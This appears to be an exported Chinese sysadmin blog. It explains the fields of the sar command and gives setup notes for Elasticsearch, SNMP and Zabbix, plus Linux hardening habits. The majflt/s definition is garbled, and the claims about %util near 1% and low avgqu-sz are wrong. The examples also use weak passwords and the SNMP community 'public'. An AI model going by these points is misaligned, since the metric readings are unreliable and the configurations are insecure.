<h2 id="sar-v-10-3"><a href="#sar-v-10-3" class="headerlink" title="sar -v 10 3"></a>sar -v 10 3</h2><p><img src="/2017/07/linux-sar/pasted_image006.png" alt="pasted_image006"></p>
<p>屏幕显示如下：</p>
<p>17:10:49 dentunusd file-nr inode-nr pty-nr</p>
<p>17:10:59 6301 5664 12037 4</p>
<p>17:11:09 6301 5664 12037 4</p>
<p>17:11:19 6301 5664 12037 4</p>
<p>Average: 6301 5664 12037 4</p>
<p>输出项说明：</p>
<p>dentunusd：目录高速缓存中未被使用的条目数量</p>
<p>file-nr：文件句柄（file handle）的使用数量</p>
<p>inode-nr：索引节点句柄（inode handle）的使用数量</p>
<p>pty-nr：使用的pty数量</p>
<ol>
<li>内存和交换空间监控</li>
</ol>
<h2 id="sar-r-10-3"><a href="#sar-r-10-3" class="headerlink" title="sar -r 10 3"></a>sar -r 10 3</h2><p>屏幕显示如下：</p>
<p><img src="/2017/07/linux-sar/pasted_image007.png" alt="pasted_image007"></p>
<p>输出项说明：</p>
<p>kbmemfree：这个值和free命令中的free值基本一致,所以它不包括buffer和cache的空间.</p>
<p>kbmemused：这个值和free命令中的used值基本一致,所以它包括buffer和cache的空间.</p>
<p>%memused：这个值是kbmemused和内存总量(不包括swap)的一个百分比.</p>
<p>kbbuffers和kbcached：这两个值就是free命令中的buffer和cache.</p>
<p>kbcommit：保证当前系统所需要的内存,即为了确保不溢出而需要的内存(RAM+swap).</p>
<p>%commit：这个值是kbcommit与内存总量(包括swap)的一个百分比.</p>
<ol>
<li>内存分页监控</li>
</ol>
<h2 id="sar-B-10-3"><a href="#sar-B-10-3" class="headerlink" title="sar -B 10 3"></a>sar -B 10 3</h2><p><img src="/2017/07/linux-sar/pasted_image008.png" alt="pasted_image008"></p>
<p>屏幕显示如下：</p>
<p>输出项说明：</p>
<p>pgpgin/s：表示每秒从磁盘或SWAP置换到内存的字节数(KB)</p>
<p>pgpgout/s：表示每秒从内存置换到磁盘或SWAP的字节数(KB)</p>
<p>fault/s：每秒钟系统产生的缺页数,即主缺页与次缺页之和(major + minor)</p>
<p>majflt/s：每秒钟产生的主缺这个值是kbmemused和内存总量(不包括swap)的一个百分比页数.</p>
<p>pgfree/s：每秒被放入空闲队列中的页个数</p>
<p>pgscank/s：每秒被kswapd扫描的页个数</p>
<p>pgscand/s：每秒直接被扫描的页个数</p>
<p>pgsteal/s：每秒钟从cache中被清除来满足内存需要的页个数</p>
<p>%vmeff：每秒清除的页(pgsteal)占总扫描页(pgscank+pgscand)的百分比</p>
<ol>
<li>I/O和传送速率监控</li>
</ol>
<h2 id="sar-b-10-3"><a href="#sar-b-10-3" class="headerlink" title="sar -b 10 3"></a>sar -b 10 3</h2><p><img src="/2017/07/linux-sar/pasted_image010.png" alt="pasted_image010"></p>
<p>屏幕显示如下：</p>
<p>18:51:05 tps rtps wtps bread/s bwrtn/s</p>
<p>18:51:15 0.00 0.00 0.00 0.00 0.00</p>
<p>18:51:25 1.92 0.00 1.92 0.00 22.65</p>
<p>18:51:35 0.00 0.00 0.00 0.00 0.00</p>
<p>Average: 0.64 0.00 0.64 0.00 7.59</p>
<p>输出项说明：</p>
<p>tps：每秒钟物理设备的 I/O 传输总量</p>
<p>rtps：每秒钟从物理设备读入的数据总量</p>
<p>wtps：每秒钟向物理设备写入的数据总量</p>
<p>bread/s：每秒钟从物理设备读入的数据量，单位为 块/s</p>
<p>bwrtn/s：每秒钟向物理设备写入的数据量，单位为 块/s</p>
<ol>
<li>进程队列长度和平均负载状态监控</li>
</ol>
<h2 id="sar-q-10-3"><a href="#sar-q-10-3" class="headerlink" title="sar -q 10 3"></a>sar -q 10 3</h2><p><img src="/2017/07/linux-sar/pasted_image011.png" alt="pasted_image011"></p>
<p>屏幕显示如下：</p>
<p>19:25:50 runq-sz plist-sz ldavg-1 ldavg-5 ldavg-15</p>
<p>19:26:00 0 259 0.00 0.00 0.00</p>
<p>19:26:10 0 259 0.00 0.00 0.00</p>
<p>19:26:20 0 259 0.00 0.00 0.00</p>
<p>Average: 0 259 0.00 0.00 0.00</p>
<p>输出项说明：</p>
<p>runq-sz：运行队列的长度（等待运行的进程数）</p>
<p>plist-sz：进程列表中进程（processes）和线程（threads）的数量</p>
<p>ldavg-1：最后1分钟的系统平均负载（System load average）</p>
<p>ldavg-5：过去5分钟的系统平均负载</p>
<p>ldavg-15：过去15分钟的系统平均负载</p>
<h2 id="系统交换活动信息监控"><a href="#系统交换活动信息监控" class="headerlink" title="系统交换活动信息监控"></a>系统交换活动信息监控</h2><h2 id="sar-W-10-3"><a href="#sar-W-10-3" class="headerlink" title="sar -W 10 3"></a>sar -W 10 3</h2><p><img src="/2017/07/linux-sar/pasted_image012.png" alt="pasted_image012"></p>
<p>屏幕显示如下：</p>
<p>19:39:50 pswpin/s pswpout/s</p>
<p>19:40:00 0.00 0.00</p>
<p>19:40:10 0.00 0.00</p>
<p>+19:40:20 0.00 0.00</p>
<p>Average: 0.00 0.00</p>
<p>输出项说明：</p>
<p>pswpin/s：每秒系统换入的交换页面（swap page）数量</p>
<p>pswpout/s：每秒系统换出的交换页面（swap page）数量</p>
<h2 id="设备使用情况监控"><a href="#设备使用情况监控" class="headerlink" title="设备使用情况监控+"></a>设备使用情况监控+</h2><h2 id="sar-d-10-3-–p"><a href="#sar-d-10-3-–p" class="headerlink" title="sar -d 10 3 –p"></a>sar -d 10 3 –p</h2><p>+屏幕显示如下：</p>
<p><img src="/2017/07/linux-sar/pasted_image013.png" alt="pasted_image013"></p>
<p>17:45:54    DEV    tps    rd_sec/s    wr_sec/s    avgrq-sz    avgqu-sz    await    svctm    %util</p>
<p>17:46:04    scd0    0.00    0.00    0.00    0.00    0.00    0.00    0.00    0.00</p>
<p>17:46:04    sda    0.00    0.00    0.00    0.00    0.00    0.00    0.00    0.00</p>
<p>17:46:04    vg_livedvd-lv_root    0.00    0.00    0.00    0.00    0.00    0.00    0.00    0.00</p>
<p>17:46:04    vg_livedvd-lv_swap    0.00    0.00    0.00    0.00    0.00    0.00    0.00    0.00</p>
<p>其中：</p>
<p>参数-p可以打印出sda,hdc等磁盘设备名称,如果不用参数-p,设备节点则有可能是dev8-0,dev22-0</p>
<p>tps:每秒从物理磁盘I/O的次数.多个逻辑请求会被合并为一个I/O磁盘请求,一次传输的大小是不确定的.</p>
<p>rd_sec/s:每秒读扇区的次数.</p>
<p>wr_sec/s:每秒写扇区的次数.</p>
<p>avgrq-sz:平均每次设备I/O操作的数据大小(扇区).</p>
<p>avgqu-sz:磁盘请求队列的平均长度.</p>
<p>await:从请求磁盘操作到系统完成处理,每次请求的平均消耗时间,包括请求队列等待时间,单位是毫秒(1秒=1000毫秒).</p>
<p>svctm:系统处理每次请求的平均时间,不包括在请求队列中消耗的时间.</p>
<p>%util:I/O请求占CPU的百分比,比率越大,说明越饱和.</p>
<ol>
<li>avgqu-sz 的值较低时，设备的利用率较高。</li>
</ol>
<ol>
<li>当%util的值接近 1% 时，表示设备带宽已经占满。</li>
</ol>
<p>要判断系统瓶颈问题，有时需几个 sar 命令选项结合起来<br>怀疑CPU存在瓶颈，可用 sar -u 和 sar -q 等来查看</p>
<p>怀疑内存存在瓶颈，可用 sar -B、sar -r 和 sar -W 等来查看</p>
<p>怀疑I/O存在瓶颈，可用 sar -b、sar -u 和 sar -d 等来查看</p>
<p>sar命令使用-n选项可以汇报网络相关信息，可用的参数包括：DEV、EDEV、SOCK和FULL。</p>
<p>如果你使用DEV关键字，那么sar将汇报和网络设备相关的信息，如lo，eth0或eth1等，例如：</p>
<p>$ sar -n DEV 1 2<br>Linux 2.6.9      10/17/2009</p>
<p>12:10:49 AM     IFACE   rxpck/s   txpck/s   rxbyt/s   txbyt/s   rxcmp/s   txcmp/s  rxmcst/s<br>12:10:50 AM      eth0     63.64      0.00   4072.73      0.00      0.00      0.00      0.00<br>12:10:50 AM      eth1     30.30     13.13   2907.07   1234.34      0.00      0.00      0.00<br>12:10:50 AM        lo      0.00      0.00      0.00      0.00      0.00      0.00      0.00<br>IFACE：就是网络设备的名称；</p>
<p>rxpck/s：每秒钟接收到的包数目</p>
<p>txpck/s：每秒钟发送出去的包数目</p>
<p>rxbyt/s：每秒钟接收到的字节数</p>
<p>txbyt/s：每秒钟发送出去的字节数</p>
<p>rxcmp/s：每秒钟接收到的压缩包数目</p>
<p>txcmp/s：每秒钟发送出去的压缩包数目</p>
<p>txmcst/s：每秒钟接收到的多播包的包数目</p>
<p>如果你使用EDEV关键字，那么会针对网络设备汇报其失败情况，例如：</p>
<p>$ sar -n EDEV 1 3<br>Linux 2.6.9     10/17/2009</p>
<p>12:15:06 AM     IFACE   rxerr/s   txerr/s    coll/s  rxdrop/s  txdrop/s  txcarr/s  rxfram/s  rxfifo/s  txfifo/s<br>12:15:07 AM        lo      0.00      0.00      0.00      0.00      0.00      0.00      0.00      0.00      0.00<br>12:15:07 AM      eth0      0.00      0.00      0.00      0.00      0.00      0.00      0.00      0.00      0.00<br>12:15:07 AM      eth1      0.00      0.00      0.00      0.00      0.00      0.00      0.00      0.00      0.00<br>rxerr/s：每秒钟接收到的损坏的包的数目</p>
<p>txerr/s：当发送包时，每秒钟发生的错误数</p>
<p>coll/s：当发送包时，每秒钟发生的冲撞(collisions)数（这个是在半双工模式下才有）</p>
<p>rxdrop/s：由于缓冲区满，网络设备接收端，每秒钟丢掉的网络包的数目</p>
<p>txdrop/s：由于缓冲区满，网络设备发送端，每秒钟丢掉的网络包的数目</p>
<p>txcarr/s：当发送数据包时，每秒钟载波错误发生的次数</p>
<p>rxfram/s：在接收数据包时，每秒钟发生的帧对齐错误的次数</p>
<p>rxfifo/s：在接收数据包时，每秒钟缓冲区溢出错误发生的次数</p>
<p>txfifo/s：在发送数据包时，每秒钟缓冲区溢出错误发生的次数</p>
<p>如果你使用SOCK关键字，则会针对socket连接进行汇报，例如：</p>
<p>$ sar -n SOCK 1 3<br>Linux 2.6.9       10/17/2009</p>
<p>12:27:29 AM    totsck    tcpsck    udpsck    rawsck   ip-frag<br>12:27:30 AM        90        41         4         0         0<br>12:27:31 AM        90        41         4         0         0<br>12:27:32 AM        90        41         4         0         0<br>Average:           90        41         4         0         0<br>totsck：被使用的socket的总数目</p>
<p>tcpsck：当前正在被使用于TCP的socket数目</p>
<p>udpsck：当前正在被使用于UDP的socket数目</p>
<p>rawsck：当前正在被使用于RAW的socket数目</p>
<p>ip-frag：当前的IP分片的数目</p>
<p>如果你使用FULL关键字，相当于上述DEV、EDEV和SOCK三者的综合。</p>
<p><strong>案例1：每两秒钟动态生成5次CPU的使用情况</strong><br>sar 2 5<br>如果 %I/Owait 这一项是一个超过0的长时间值，那么我们就要考虑是否在输入输出系统方面存在瓶颈(比如硬盘或者网络)。<br><strong>案例2：使用-o选项保存sar命令的输出结果</strong><br># sar 2 5 -o /tmp/data  /dev/null 2&amp;1<br>使用“sar -f ”输出结果：<br>sar -f <a href="file:///home/user/%E6%A1%8C%E9%9D%A2/Dropbox/zimwiki/tmp/data">/tmp/data</a><br><strong>案例3：使用-r选项生成内存的使用情况报告</strong><br>-r选项在sar命令中被用以生成内存的使用报告。<br><strong>sar -r 2 5</strong><br>kbcommit和%commit列的数据包括了内存和交换区使用量的总和。<br><strong>案例4：用-B选项生成分页统计报告</strong><br>sar -B 2 5</p>
<p>报告里，majflts/s主要显示从硬盘交换区载入物理内存时的异常，如果这个值变高，那么我们可以说系统目前仅仅使用了内存(RAM)。<br>%vmeff 表示每秒扫描的页面数，如果说当它的值是100%时是正常情况，它是30%以下的时候就可以认为虚拟内存存在一些问题。0值表示在那个时候没有任何一个页面被扫描。</p>
<p><strong>案例:5 使用-d选项生成块设备使用情况报告</strong></p>
<p>-d 选项在sar命令中被用以显示块设备的状态报告。在 -d 后面加上 -p  (pretty-print)选项可以增强 dev 列的可读性，如下图所示：<br>sar -d -p 2 4</p>
<p><strong>案例6：用-n生成网络使用情况报告</strong></p>
<p>-n选项在sar命令中被用来生成网络使用情况的统计报告。下面是语法规则：<br># sar -n {keyword} or {ALL}<br>sar -n ALL<br><strong>案例7：用-f读sar日志文件</strong></p>
<p>我们前面已经讨论了sar的日志文件是保存在“/var/log/sa/saDD”里的。使用-f选项可以查看日志文件。<br>sar -r -f /var/log/sa/sa26</p>
]]></content>
      <tags>
        <tag>sar</tag>
      </tags>
  </entry>
  <entry>
    <title>elasticsearch install</title>
    <url>/2017/07/elasticsearch-install/</url>
    <content><![CDATA[<h1 id="使用supervisor-控制es"><a href="#使用supervisor-控制es" class="headerlink" title="使用supervisor 控制es"></a>使用supervisor 控制es</h1><p>1.安装java环境</p>
<p><code>略</code></p>
<p>1.安装es</p>
<p>3.配置环境变量</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat  &lt;&lt;EOF&gt;&gt;&#x2F;etc&#x2F;profile.d&#x2F;java.sh</span></pre></td></tr><tr><td class="code"><pre><span class="line">JAVA_HOME&#x3D;&#x2F;usr&#x2F;java&#x2F;default</span></pre></td></tr><tr><td class="code"><pre><span class="line">PATH&#x3D;$JAVA_HOME&#x2F;bin:$PATH</span></pre></td></tr><tr><td class="code"><pre><span class="line">CLASSPATH&#x3D;.:$JAVA_HOME&#x2F;lib&#x2F;dt.jar:$JAVA_HOME&#x2F;lib&#x2F;tools.jar</span></pre></td></tr><tr><td class="code"><pre><span class="line">ES_JAVA_OPTS&#x3D;&quot;-Xms3042 -Xmx3042m&quot;</span></pre></td></tr><tr><td class="code"><pre><span class="line">EOF</span></pre></td></tr></table></figure>
<p>修改文件描述符解决open file too many</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;sysctl.conf</span></pre></td></tr><tr><td class="code"><pre><span class="line">fs.file-max&#x3D;102400</span></pre></td></tr></table></figure>
<p><strong>vm.max_map_count [65530] is too low</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vm.max_map_count&#x3D;655360</span></pre></td></tr></table></figure>
<p>es check</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">* soft nproc 2048</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">* hard nproc 4096</span></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[program:es]</span></pre></td></tr><tr><td class="code"><pre><span class="line">command&#x3D;&#x2F;home&#x2F;es&#x2F;elasticsearch&#x2F;bin&#x2F;elasticsearch</span></pre></td></tr><tr><td class="code"><pre><span class="line">directory&#x3D;&#x2F;home&#x2F;es&#x2F;elasticsearch&#x2F;</span></pre></td></tr><tr><td class="code"><pre><span class="line">#startsecs&#x3D;0</span></pre></td></tr><tr><td class="code"><pre><span class="line">user&#x3D;es</span></pre></td></tr><tr><td class="code"><pre><span class="line">#stopwaitsecs&#x3D;0</span></pre></td></tr><tr><td class="code"><pre><span class="line">autostart&#x3D;true</span></pre></td></tr><tr><td class="code"><pre><span class="line">autorestart&#x3D;true</span></pre></td></tr><tr><td class="code"><pre><span class="line">redirect_stderr&#x3D;true</span></pre></td></tr><tr><td class="code"><pre><span class="line">stdout_logfile&#x3D;&#x2F;dev&#x2F;stdout</span></pre></td></tr><tr><td class="code"><pre><span class="line">stdout_logfile_maxbytes&#x3D;0</span></pre></td></tr></table></figure>
<p>修改supervisor的配置</p>
<p>minfds=100000 #文件描述符大小</p>
<p>解决由于supervisor引起的Too many open files</p>
<p>那么 ElasticSearch 设置的最大文件数到底是多少呢？</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">shell&gt; cat &#x2F;proc&#x2F;&lt;ES PID&gt;&#x2F;limits</span></pre></td></tr></table></figure>
<p> ElasticSearch 打开的文件：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">shell&gt; ls &#x2F;proc&#x2F;&lt;PID&gt;&#x2F;fd</span></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>snmp config</title>
    <url>/2017/07/snmp-config/</url>
    <content><![CDATA[<h1 id="SNMP配置"><a href="#SNMP配置" class="headerlink" title="SNMP配置"></a>SNMP配置</h1><p>1.安装</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yum install net-snmp #snmp 客户端</span></pre></td></tr><tr><td class="code"><pre><span class="line">yum install net-snmp-utils #snmp 管理端，如果使用snmp trap则需要安装net-snmp</span></pre></td></tr></table></figure>
<p><strong>修改查看设备节点的权限</strong></p>
<p>view：定义了可以查看哪些节点设备的信息。</p>
<p>snmp默认配置只能查看.1.3.6.1.2.1.1和.1.3.6.1.2.1.25.1.1节点下的设备信息，而主机CPU和内存等设备都不在这些节点下，所以无法获取这些数据。</p>
<p>在<code>/etc/snmp/snmpd.conf</code>中，找到如下位置：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">####</span></pre></td></tr><tr><td class="code"><pre><span class="line"># Third, create a view for us to let the group have rights to:</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line"># Make at least  snmpwalk -v 1 localhost -c public system fast again.</span></pre></td></tr><tr><td class="code"><pre><span class="line">#       name           incl&#x2F;excl     subtree         mask(optional)</span></pre></td></tr><tr><td class="code"><pre><span class="line">view    systemview    included   .1.3.6.1.2.1.1</span></pre></td></tr><tr><td class="code"><pre><span class="line">view    systemview    included   .1.3.6.1.2.1.25.1.1</span></pre></td></tr><tr><td class="code"><pre><span class="line">view    systemview    included   .1 #增加</span></pre></td></tr></table></figure>
<p>取消如下注释</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">proc mountd</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">#  Make sure there are no more than 4 ntalkds running, but 0 is ok too.</span></pre></td></tr><tr><td class="code"><pre><span class="line">proc ntalkd 4</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">#  Make sure at least one sendmail, but less than or equal to 10 are running.</span></pre></td></tr><tr><td class="code"><pre><span class="line">proc sendmail 10 1</span></pre></td></tr><tr><td class="code"><pre><span class="line">exec echotest &#x2F;bin&#x2F;echo hello world</span></pre></td></tr><tr><td class="code"><pre><span class="line">disk &#x2F; 10000</span></pre></td></tr><tr><td class="code"><pre><span class="line">load 12 14 14</span></pre></td></tr></table></figure>
<p>配置community</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#       sec.name  source          community</span></pre></td></tr><tr><td class="code"><pre><span class="line">#com2sec notConfigUser  default       public</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">com2sec notConfigUser  127.0.0.1       mypublic</span></pre></td></tr><tr><td class="code"><pre><span class="line">com2sec notConfigUser  172.16.16.0&#x2F;24       public</span></pre></td></tr></table></figure>
<p>测试</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">snmpnetstat -v 2c -c mypublic localhost</span></pre></td></tr><tr><td class="code"><pre><span class="line">snmpwalk -v 2c -c public localhost hrStorageDescr</span></pre></td></tr><tr><td class="code"><pre><span class="line">snmpwalk -v 2c -c public localhost host</span></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>zabbix install</title>
    <url>/2017/07/zabbix-install/</url>
    <content><![CDATA[<h1 id="zabbix-安装和使用"><a href="#zabbix-安装和使用" class="headerlink" title="zabbix 安装和使用"></a>zabbix 安装和使用</h1><p>1.利用zabbix 源安装</p>
<p><strong>增加zabbix源</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rpm -ivh http:&#x2F;&#x2F;repo.zabbix.com&#x2F;zabbix&#x2F;3.2&#x2F;rhel&#x2F;7&#x2F;x86_64&#x2F;zabbix-release-3.2-1.el7.noarch.rpm</span></pre></td></tr></table></figure>
<p><strong>安装zabbix服务端</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yum --enablerepo&#x3D;zabbix install zabbix-server-mysql zabbix-web-mysql</span></pre></td></tr><tr><td class="code"><pre><span class="line">yum --enablerepo&#x3D;zabbix install zabbix-get</span></pre></td></tr></table></figure>
<p><strong>安装zabbix客户端</strong><br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yum --enablerepo&#x3D;zabbix install zabbix-agent</span></pre></td></tr></table></figure></p>
<p><strong>安装mysql</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yum install mariadb-server</span></pre></td></tr><tr><td class="code"><pre><span class="line">systemctl enable mariadb</span></pre></td></tr><tr><td class="code"><pre><span class="line">systemctl start mariadb</span></pre></td></tr></table></figure>
<p><strong>配置mysql</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql -u root</span></pre></td></tr><tr><td class="code"><pre><span class="line">&gt;update mysql.user set password&#x3D;password(&#39;zabbix&#39;) ;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&gt;flush privilges</span></pre></td></tr><tr><td class="code"><pre><span class="line">&gt;create database zabbix character set utf8 collate utf8_bin;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&gt;grant all privileges on zabbix.* to zabbix@localhost identified by &#39;zabbix&#39;;</span></pre></td></tr></table></figure>
<p><strong>导入数据库</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">zcat &#x2F;usr&#x2F;share&#x2F;doc&#x2F;zabbix-server-mysql-3.2.*&#x2F;create.sql.gz | mysql -uzabbix -p zabbix</span></pre></td></tr></table></figure>
<p><strong>zabbix配置</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># vi &#x2F;etc&#x2F;zabbix&#x2F;zabbix_server.conf</span></pre></td></tr><tr><td class="code"><pre><span class="line">DBHost&#x3D;localhost</span></pre></td></tr><tr><td class="code"><pre><span class="line">DBName&#x3D;zabbix</span></pre></td></tr><tr><td class="code"><pre><span class="line">DBUser&#x3D;zabbix</span></pre></td></tr><tr><td class="code"><pre><span class="line">DBPassword&#x3D;&lt;password&gt;</span></pre></td></tr></table></figure>
<p><strong>启动</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># systemctl start zabbix-server</span></pre></td></tr><tr><td class="code"><pre><span class="line"># systemctl enable zabbix-server</span></pre></td></tr><tr><td class="code"><pre><span class="line"># systemctl start zabbix-agent</span></pre></td></tr><tr><td class="code"><pre><span class="line"># systemctl enable zabbix-agent</span></pre></td></tr></table></figure>
<p><strong>PHP配置</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vi &#x2F;etc&#x2F;httpd&#x2F;conf.d&#x2F;zabbix.conf</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">php_value max_execution_time 300</span></pre></td></tr><tr><td class="code"><pre><span class="line">php_value memory_limit 128M</span></pre></td></tr><tr><td class="code"><pre><span class="line">php_value post_max_size 16M</span></pre></td></tr><tr><td class="code"><pre><span class="line">php_value upload_max_filesize 2M</span></pre></td></tr><tr><td class="code"><pre><span class="line">php_value max_input_time 300</span></pre></td></tr><tr><td class="code"><pre><span class="line">php_value always_populate_raw_post_data -1</span></pre></td></tr><tr><td class="code"><pre><span class="line">php_value date.timezone Asia&#x2F;Shanghai #这个很重要</span></pre></td></tr></table></figure>
<p>中文乱码</p>
<p>下载支持中文的字体如simsum.ttf 进入目录替换<code>cd /usr/share/zabbix/fonts</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mv simsun.ttf graphfont.ttf</span></pre></td></tr></table></figure>
<h2 id="安装agent"><a href="#安装agent" class="headerlink" title="安装agent"></a>安装agent</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rpm -ivh http:&#x2F;&#x2F;repo.zabbix.com&#x2F;zabbix&#x2F;3.2&#x2F;rhel&#x2F;7&#x2F;x86_64&#x2F;zabbix-release-3.2-1.el7.noarch.rpm</span></pre></td></tr><tr><td class="code"><pre><span class="line">yum --enablerepo&#x3D;zabbix install zabbix-agent -y</span></pre></td></tr></table></figure>
<p>设置</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat &lt;&lt;EOF&gt;&gt;&#x2F;etc&#x2F;zabbix&#x2F;zabbix_agentd.conf</span></pre></td></tr><tr><td class="code"><pre><span class="line">Hostname&#x3D;172.16.16.134#填写监控主机的信息</span></pre></td></tr><tr><td class="code"><pre><span class="line">Server&#x3D;172.16.16.136</span></pre></td></tr><tr><td class="code"><pre><span class="line">ServerActive&#x3D;172.16.16.136</span></pre></td></tr><tr><td class="code"><pre><span class="line">EOF</span></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl enable zabbix-agent</span></pre></td></tr><tr><td class="code"><pre><span class="line">systemctl start zabbix-agent</span></pre></td></tr></table></figure>
<p><strong>在服务器端测试</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">zabbix_get -s 172.16.16.135 -p 10050 -k &quot;system.uptime&quot;</span></pre></td></tr></table></figure>
<p>如果测试不通，请检查日志/var/log/zabbix/zabbix_server.log</p>
]]></content>
      <categories>
        <category>zabbix</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>zabbix</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux 加固</title>
    <url>/2019/02/Linux_jagu_01/</url>
    <content><![CDATA[<p>摘自2017 年部分文档</p>
<h2 id="运维习惯"><a href="#运维习惯" class="headerlink" title="运维习惯"></a>运维习惯</h2><p>1.1 不使用root账户登录</p>
<p>1.2 不用rm –rf 可以用mv代替,把删除文件移动到 /tmp 目录下 写个定时计划清理缓存。或者用脚本替换到rm 为mv 增加回收站的功能</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">alias rm&#x3D;&#39;trash&#39;</span></pre></td></tr><tr><td class="code"><pre><span class="line">alias rl&#x3D;&#39;trashlist&#39;</span></pre></td></tr><tr><td class="code"><pre><span class="line">alias ur&#x3D;&#39;undelfile&#39;</span></pre></td></tr><tr><td class="code"><pre><span class="line">#替换rm指令移动文件到~&#x2F;.trash&#x2F;中</span></pre></td></tr><tr><td class="code"><pre><span class="line">trash()</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">mv $@ ~&#x2F;.trash&#x2F;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">#显示回收站中垃圾清单</span></pre></td></tr><tr><td class="code"><pre><span class="line">trashlist()</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">echo -e &quot;33[32m&#x3D;&#x3D;&#x3D;&#x3D; Garbage Lists in ~&#x2F;.trash&#x2F; &#x3D;&#x3D;&#x3D;&#x3D;33[0m&quot;</span></pre></td></tr><tr><td class="code"><pre><span class="line">echo -e &quot;\a33[33m----Usage------33[0m&quot;</span></pre></td></tr><tr><td class="code"><pre><span class="line">echo -e &quot;\a33[33m-1- Use &#39;cleartrash&#39; to clear all garbages in ~&#x2F;.trash!!!33[0m&quot;</span></pre></td></tr><tr><td class="code"><pre><span class="line">echo -e &quot;\a33[33m-2- Use &#39;ur&#39; to mv the file in garbages to current dir!!!33[0m&quot;</span></pre></td></tr><tr><td class="code"><pre><span class="line">ls -al ~&#x2F;.trash</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">#找回回收站相应文件</span></pre></td></tr><tr><td class="code"><pre><span class="line">undelfile()</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">mv -i ~&#x2F;.trash&#x2F;$@ .&#x2F;</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">#清空回收站</span></pre></td></tr><tr><td class="code"><pre><span class="line">cleartrash()</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#123;</span></pre></td></tr><tr><td class="code"><pre><span class="line">echo -ne &quot;\a33[33m!!!Clear all garbages in ~&#x2F;.trash, Sure?[y&#x2F;n]33[0m&quot;</span></pre></td></tr><tr><td class="code"><pre><span class="line">read confirm</span></pre></td></tr><tr><td class="code"><pre><span class="line">if [ $confirm &#x3D;&#x3D; &#39;y&#39; -o $confirm &#x3D;&#x3D; &#39;Y&#39; ] ;then</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#x2F;bin&#x2F;rm -rf ~&#x2F;.trash&#x2F;*</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#x2F;bin&#x2F;rm -rf ~&#x2F;.trash&#x2F;.* 2&gt;&#x2F;dev&#x2F;null</span></pre></td></tr><tr><td class="code"><pre><span class="line">fi</span></pre></td></tr><tr><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure>
<p>1.3  生产环境中所有操作都要求记录，并且已经实践过</p>
<p>1.4  密码定期更改（90天）建议使用证书登录并且有密码验证</p>
<p>1.5 账号密码需要纸质材料保管</p>
<p>1.6 设置定期更新系统，关注漏洞信息</p>
<p>1.7  遵循最小化原则，系统最小化，应用最小化，操作最小化，能不开的端口绝对不开</p>
<p>1.8  定期对系统和应用进行检查和扫描</p>
<p>1.9  经常关注新技术，并且不断学习</p>
<p>1.10 时刻保证充沛的精力，利用小时间休息</p>
<p>1.11 运维安全不分家，时刻关注最新漏洞情况</p>
<p>1.12 一定要有开发能力，运维不是为了逃避开发，是因为喜欢这份工作</p>
